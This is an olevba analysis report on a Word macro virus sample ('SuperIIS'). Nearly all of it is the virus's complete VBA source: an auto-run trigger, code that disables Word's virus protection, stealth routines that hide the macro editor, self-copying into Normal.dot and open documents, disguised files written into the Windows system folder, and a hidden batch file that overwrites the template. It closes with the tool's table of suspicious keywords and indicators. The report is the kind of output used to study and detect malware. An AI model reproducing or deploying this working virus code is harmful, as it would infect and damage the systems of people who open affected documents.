olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.IIS.p-1756ee62e305f23c2a914c7719004b9267f5a574
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.IIS.p-1756ee62e305f23c2a914c7719004b9267f5a574 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modul1.bas 
in file: Virus.MSWord.IIS.p-1756ee62e305f23c2a914c7719004b9267f5a574 - OLE stream: 'Macros/VBA/Modul1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error GoTo eb
'MyName=SuperIIS
Call MakeView
eb:
End Sub
Sub StealthDoc()
On Error GoTo eb
'Clean NormalTemplate:
ms = NormalTemplate.VBProject.VBComponents.Count
For i = 1 To ms
a = NormalTemplate.VBProject.VBComponents.Item(i).CodeModule.countofLines
If a > 1 Then f = NormalTemplate.VBProject.VBComponents.Item(i).CodeModule.lines(1, 1)
If UCase(f) = "SUB VIEWVBCODE()" Then Exit For
Next i
If UCase(f) = "SUB VIEWVBCODE()" Then
a = NormalTemplate.VBProject.VBComponents(i).Name
Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=a, Object:=wdOrganizerObjectProjectItems
End If
For n = 1 To ms
a = NormalTemplate.VBProject.VBComponents.Item(n).CodeModule.countofLines
If a > 1 Then f = NormalTemplate.VBProject.VBComponents.Item(n).CodeModule.lines(3, 1)
If UCase(f) = "'MYNAME=SUPERIIS" Then Exit For
Next n
If UCase(f) = "'MYNAME=SUPERIIS" Then
a = NormalTemplate.VBProject.VBComponents(n).Name
Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=a, Object:=wdOrganizerObjectProjectItems
End If
f = ""
'Clean Document:
f = ""
ms = ActiveDocument.VBProject.VBComponents.Count
For ii = 1 To ms
a = ActiveDocument.VBProject.VBComponents.Item(ii).CodeModule.countofLines
If a > 1 Then f = ActiveDocument.VBProject.VBComponents.Item(ii).CodeModule.lines(1, 1)
If UCase(f) = "SUB VIEWVBCODE()" Then Exit For
Next ii
If UCase(f) = "SUB VIEWVBCODE()" Then
a = ActiveDocument.VBProject.VBComponents(ii).Name
Application.OrganizerDelete Source:=ActiveDocument.FullName, Name:=a, Object:=wdOrganizerObjectProjectItems
End If
For fg = 1 To ms
f = ""
a = ActiveDocument.VBProject.VBComponents.Item(fg).CodeModule.countofLines
If a > 1 Then f = ActiveDocument.VBProject.VBComponents.Item(fg).CodeModule.lines(3, 1)
If UCase(f) = "'MYNAME=SUPERIIS" Then Exit For
Next fg
If UCase(f) = "'MYNAME=SUPERIIS" Then
a = ActiveDocument.VBProject.VBComponents(fg).Name
Application.OrganizerDelete Source:=ActiveDocument.FullName, Name:=a, Object:=wdOrganizerObjectProjectItems
End If
esub:
Close
Open "c:\msdos.sys" For Input As #1
Do Until EOF(1)
Line Input #1, a
If Left(UCase(a), 7) = "WINDIR=" Then
l = Len(a)
windir = Mid(a, 8, l)
End If
Loop
x = NormalTemplate.VBProject.VBComponents(1).CodeModule.countofLines
Close
Open "c:\lo.sys" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Close
NormalTemplate.VBProject.VBComponents.Import "c:\lo.sys"
NormalTemplate.VBProject.VBComponents(1).CodeModule.deleteLines 1, x
NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines 1, "Private Sub ToolsMacro()"
NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines 2, "Application.dialogs (wddialogtoolsmacro).show"
NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines 3, "End Sub"
ShowVisualBasicEditor = True
If windir = "" Then Exit Sub
a = Shell(windir & "\system\lo.bat", 0)
eb:
End Sub
Sub MacroSDoc()
On Error GoTo eb
'Clean NormalTemplate:
ms = NormalTemplate.VBProject.VBComponents.Count
For i = 1 To ms
a = NormalTemplate.VBProject.VBComponents.Item(i).CodeModule.countofLines
If a > 1 Then f = NormalTemplate.VBProject.VBComponents.Item(i).CodeModule.lines(1, 1)
If UCase(f) = "SUB VIEWVBCODE()" Then Exit For
Next i
If UCase(f) = "SUB VIEWVBCODE()" Then
a = NormalTemplate.VBProject.VBComponents(i).Name
Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=a, Object:=wdOrganizerObjectProjectItems
End If
For n = 1 To ms
a = NormalTemplate.VBProject.VBComponents.Item(n).CodeModule.countofLines
If a > 1 Then f = NormalTemplate.VBProject.VBComponents.Item(n).CodeModule.lines(3, 1)
If UCase(f) = "'MYNAME=SUPERIIS" Then Exit For
Next n
If UCase(f) = "'MYNAME=SUPERIIS" Then
a = NormalTemplate.VBProject.VBComponents(n).Name
Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=a, Object:=wdOrganizerObjectProjectItems
End If
f = ""
'Clean Document:
f = ""
ms = ActiveDocument.VBProject.VBComponents.Count
For ii = 1 To ms
a = ActiveDocument.VBProject.VBComponents.Item(ii).CodeModule.countofLines
If a > 1 Then f = ActiveDocument.VBProject.VBComponents.Item(ii).CodeModule.lines(1, 1)
If UCase(f) = "SUB VIEWVBCODE()" Then Exit For
Next ii
If UCase(f) = "SUB VIEWVBCODE()" Then
a = ActiveDocument.VBProject.VBComponents(ii).Name
Application.OrganizerDelete Source:=ActiveDocument.FullName, Name:=a, Object:=wdOrganizerObjectProjectItems
End If
For fg = 1 To ms
f = ""
a = ActiveDocument.VBProject.VBComponents.Item(fg).CodeModule.countofLines
If a > 1 Then f = ActiveDocument.VBProject.VBComponents.Item(fg).CodeModule.lines(3, 1)
If UCase(f) = "'MYNAME=SUPERIIS" Then Exit For
Next fg
If UCase(f) = "'MYNAME=SUPERIIS" Then
a = ActiveDocument.VBProject.VBComponents(fg).Name
Application.OrganizerDelete Source:=ActiveDocument.FullName, Name:=a, Object:=wdOrganizerObjectProjectItems
End If
esub:
Close
Open "c:\msdos.sys" For Input As #1
Do Until EOF(1)
Line Input #1, a
If Left(UCase(a), 7) = "WINDIR=" Then
l = Len(a)
windir = Mid(a, 8, l)
End If
Loop
If windir = "" Then Exit Sub
a = Shell(windir & "\system\lo.bat", 0)
x = NormalTemplate.VBProject.VBComponents(1).CodeModule.countofLines
Close
Open "c:\lo.sys" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Close
NormalTemplate.VBProject.VBComponents.Import "c:\lo.sys"
NormalTemplate.VBProject.VBComponents(1).CodeModule.deleteLines 1, x
NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines 1, "Private Sub ToolsMacro()"
NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines 2, "Application.dialogs (wddialogtoolsmacro).show"
NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines 3, "End Sub"
eb:
End Sub
Private Sub MakeView()
On Error GoTo eb
StealthCode = "Sub ViewVbCode()" & Chr(13)
StealthCode = StealthCode & "Call Stealth" & Chr(13)
StealthCode = StealthCode & "end sub" & Chr(13)
StealthCode = StealthCode & "sub ToolsMacro" & Chr(13)
StealthCode = StealthCode & "Call MacroS" & Chr(13)
StealthCode = StealthCode & "End Sub" & Chr(13)
ms = NormalTemplate.VBProject.VBComponents.Count
For i = 1 To ms
a = NormalTemplate.VBProject.VBComponents.Item(i).CodeModule.countofLines
If a > 1 Then f = NormalTemplate.VBProject.VBComponents.Item(i).CodeModule.lines(1, 1)
If UCase(f) = "SUB VIEWVBCODE()" Then Exit For
Next i
If UCase(f) = "SUB VIEWVBCODE()" Then
NormalTemplate.VBProject.VBComponents.Item(i).CodeModule.deleteLines 1, a
NormalTemplate.VBProject.VBComponents.Item(i).CodeModule.AddFromString (StealthCode)
Else
Close
Open "c:\msdos.sys" For Input As #1
Do Until EOF(1)
Line Input #1, a
If Left(UCase(a), 7) = "WINDIR=" Then
l = Len(a)
windir = Mid(a, 8, l)
End If
Loop
If windir = "" Then Exit Sub
Close
gg = Dir(windir & "\system\losys.exe")
If gg <> "" Then Kill windir & "\system\losys.exe"
Open windir & "\System\losys.exe" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Print #1, StealthCode
Close
NormalTemplate.VBProject.VBComponents.Import windir & "\System\losys.exe"
End If
Call FileClose
eb:
End Sub
Sub FileClose()
On Error GoTo eb
Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False
Close
Open "c:\msdos.sys" For Input As #1
Do Until EOF(1)
Line Input #1, a
If Left(UCase(a), 7) = "WINDIR=" Then
l = Len(a)
windir = Mid(a, 8, l)
End If
Loop
If windir = "" Then Exit Sub
On Error GoTo NoInf
a = ActiveDocument.VBProject.VBComponents.Count
For i = 1 To a
ls = ActiveDocument.VBProject.VBComponents(i).CodeModule.countofLines
If ls > 1 Then l = ActiveDocument.VBProject.VBComponents(i).CodeModule.lines(3, 1)
If UCase(l) = "'MYNAME=SUPERIIS" Then
acd = 1
Exit For
End If
Next i
If acd = 1 Then
FullCode = "Sub AutoExec" & Chr(13)
a = ActiveDocument.VBProject.VBComponents.Item(i).CodeModule.countofLines
For ii = 2 To a
If ii = 7 Then GoTo no2
If ii = 77 Then GoTo no2
If ii = 186 Then GoTo no2
If ii = 183 Then GoTo no2
l = ActiveDocument.VBProject.VBComponents.Item(i).CodeModule.lines(ii, 1)
FullCode = FullCode & l & Chr(13)
no2:
If ii = 7 Then FullCode = FullCode & "Sub Stealth" & Chr(13)
If ii = 77 Then FullCode = FullCode & "Sub MacroS" & Chr(13)
If ii = 186 Then FullCode = FullCode & "Sub AutoClose" & Chr(13)
If ii = 183 Then FullCode = FullCode & "Call AutoClose" & Chr(13)
Next ii
End If
a = NormalTemplate.VBProject.VBComponents.Count
For iii = 1 To a
ls = NormalTemplate.VBProject.VBComponents(iii).CodeModule.countofLines
If ls > 1 Then l = NormalTemplate.VBProject.VBComponents(iii).CodeModule.lines(3, 1)
If UCase(l) = "'MYNAME=SUPERIIS" Then
NormT = 1
Exit For
End If
Next iii
If NormT = 1 Then
FullCode = "Sub AutoOpen" & Chr(13)
a = NormalTemplate.VBProject.VBComponents.Item(iii).CodeModule.countofLines
For iiii = 2 To a
If iiii = 7 Then GoTo non2
If iiii = 77 Then GoTo non2
If iiii = 186 Then GoTo non2
If iiii = 183 Then GoTo non2
l = NormalTemplate.VBProject.VBComponents.Item(iii).CodeModule.lines(iiii, 1)
FullCode = FullCode & l & Chr(13)
non2:
If iiii = 7 Then FullCode = FullCode & "Sub StealthDoc" & Chr(13)
If iiii = 77 Then FullCode = FullCode & "Sub MacroSDoc" & Chr(13)
If iiii = 186 Then FullCode = FullCode & "Sub FileClose" & Chr(13)
If iiii = 183 Then FullCode = FullCode & "Call FileClose" & Chr(13)
Next iiii
End If
If NormT <> 1 Then
a = Dir(windir & "\System\lo.sys")
If a <> "" Then Kill windir & "\System\lo.sys"
Application.NormalTemplate.OpenAsDocument
Close
d = Dir(windir & "\System\vmm64.vxd")
If d <> "" Then Kill windir & "\System\vmm64.vxd"
Open windir & "\System\Vmm64.vxd" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Print #1, FullCode
Close
ActiveDocument.VBProject.VBComponents.Import windir & "\System\Vmm64.VXD"
ActiveDocument.SaveAs FileName:=windir & "\System\lo.sys", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
ActiveDocument.Save
ActiveDocument.Close
a = Dir(windir & "\System\lo.bat")
If a <> "" Then Kill windir & "\System\lo.bat"
Close
Open windir & "\System\lo.bat" For Append As #1
Print #1, ":Begin"
l = Len(NormalTemplate.FullName)
l = l - 10
Print #1, "If not exist " & Left(NormalTemplate.FullName, l) & "~$Normal.dot goto start"
Print #1, "Goto Begin"
Print #1, ":Start"
Print #1, windir & "\command\Attrib.exe -s -h -r " & NormalTemplate.FullName
Print #1, "Copy/y " & windir & "\System\lo.sys " & NormalTemplate.FullName
Print #1, windir & "\command\Attrib.exe -s -h -r " & NormalTemplate.FullName
Print #1, "Copy/y " & windir & "\System\lo.sys " & NormalTemplate.FullName
Print #1, windir & "\command\Attrib.exe -s -h -r " & NormalTemplate.FullName
Print #1, "Copy/y " & windir & "\System\lo.sys " & NormalTemplate.FullName
Close
a = Shell(windir & "\System\lo.bat", 0)
End If
If acd <> 1 Then
Close
d = Dir(windir & "\System\vmm64.vxd")
If d <> "" Then Kill windir & "\System\vmm64.vxd"
Open windir & "\System\Vmm64.vxd" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Print #1, FullCode
Close
ActiveDocument.VBProject.VBComponents.Import windir & "\System\Vmm64.VXD"
If UCase(Left(ActiveDocument.FullName, 1)) <> "A" And Mid(ActiveDocument.FullName, 3, 1) = "\" Then ActiveDocument.Save
End If
NoInf:

eb:
End Sub








+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |lo.bat              |Executable file name                         |
|IOC       |losys.exe           |Executable file name                         |
|IOC       |Attrib.exe          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

